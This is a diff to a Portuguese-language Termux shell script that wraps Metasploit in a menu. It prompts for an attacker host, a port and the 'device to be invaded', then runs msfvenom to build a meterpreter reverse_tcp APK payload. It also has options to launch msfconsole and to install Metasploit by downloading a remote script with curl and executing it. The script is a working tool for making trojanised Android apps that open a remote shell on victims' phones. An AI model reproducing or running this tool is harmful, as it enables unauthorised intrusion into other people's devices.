@@ -5,42 +5,75 @@
 #Limpar a tela
 clear
 #
-#BANNER
-echo "#################################"
-echo "#          HACKING              #"
-echo "#         AUTOMÁTICO            #"
-echo "#                               #"
-echo "#                               #"
-echo "#################################"
+#Escrever MSVENOM
+figlet MSFVENOM
 #
 #
-#Entrando na pasta do metasploit-framework
+#MENU
+echo
+echo '======================================='
+echo '= \033[1;34m[\033[1;31m1]>> \033[1;33mCriar payload'
+echo '= \033[1;34m[\033[1;31m2]>> \033[1;33mIniciar Metasploit'
+echo '= \033[1;34m[\033[1;31m3]>> \033[1;33mInstalar Metasploit'
+echo '= \033[1;34m[\033[1;31m4]>> \033[1;33mSair'
+echo '======================================='
+echo
+#Escolher entre 1 2 ou 3
+#obrigado por usar
+read -p "[+]>>" opcao
+echo
+if [ "$opcao" = "1" ];then
+clear
+figlet Payload
+echo
+ echo "Criando Payload"; sleep 2
+echo
+echo "\033[1;32m\n\n[+]=>DIGITE O HOST SEU HOST"
+read -p "[+]=>" host
+echo
+echo "\033[1;32m\n\n[+]=>DIGITE A PORTA QUE VOCE QUER USAR"
+read -p "[+]=>" porta
+echo
+echo "\033[1;32m\n\n[+]=>DIGITE O NOME DO PAYLOAD"
+read -p "[+]=>" nome
+echo
+echo "\033[1;32m\n\n[+]=>INFORME O DISPOSITIVO A SER INVADIDO"
+read -p "[+]=>" dispo
+#
+#Entrando na pasta do metasploit
+cd ..
 cd $HOME ; cd metasploit-framework
 #
+#Criando payload
+./msfvenom -p $dispo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R /sdcard/$nome.apk
+fi
+if [ "$opcao" = "2" ];then
 echo
-echo
-echo "INFORME O HOST DO SEU TERMUX:"
-read -p "[+]>>" host
-echo
-echo  "INFORME A PORTA QUE VOCE QUER USAR:"
-read -p "[+]>>" porta
-echo
-echo "INFORME O DISPOSITIVO QUE VOCE QUER HACKEAR:"
-read -p "[+]>>" dispositivo
-echo
-echo  "INFORME O NOME DO PAYLOAD:"
-read -p "[+]>>" nome
 #
-
-if [ "$META = 1" ];then
- echo "criando payload..."; sleep 2
-./msfvenom -p $dispositivo/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > /sdcard/$nome.apk
-
-echo "payload criado!"; sleep 2
-fi
-if [ "$META = 2" ];then 
- echo "iniciando msfconsole..."
+#Entrando na pasta do metasploit
+clear
+figlet Msfconsole
+cd ..
+cd $HOME ; cd metasploit-framework
+#
+#Executando o msfconsole
 ./msfconsole
-echo "msfconsole executado!"; sleep 2
 fi
-
+if [ "$opcao" = "3" ];then
+echo
+ echo "\033[1;32m\n\n[+]=>INSTALANDO METASPLOIT"; sleep 2
+echo
+cd ..
+termux-setup-storage
+pkg install curl
+curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+chmod +x metasploit.sh
+./metasploit.sh
+fi
+if [ "$opcao" = "4" ];then
+ echo
+clear
+figlet Exit
+sleep 1
+exit
+fi
